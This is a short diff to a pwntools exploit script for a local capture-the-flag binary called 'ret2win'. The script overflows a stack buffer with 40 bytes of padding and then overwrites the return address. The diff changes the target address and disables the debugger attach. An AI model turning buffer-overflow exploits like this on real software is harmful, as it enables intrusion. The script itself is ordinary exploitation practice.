@@ -3,7 +3,7 @@ from pwn import *
 io = process("./ret2win")
 
 payload = b"a"*40
-payload += p64(0x0000000000400756)
+payload += p64(0x0000000000400769)
 io.sendline(payload)
-gdb.attach(io)
+#gdb.attach(io)
 io.interactive()
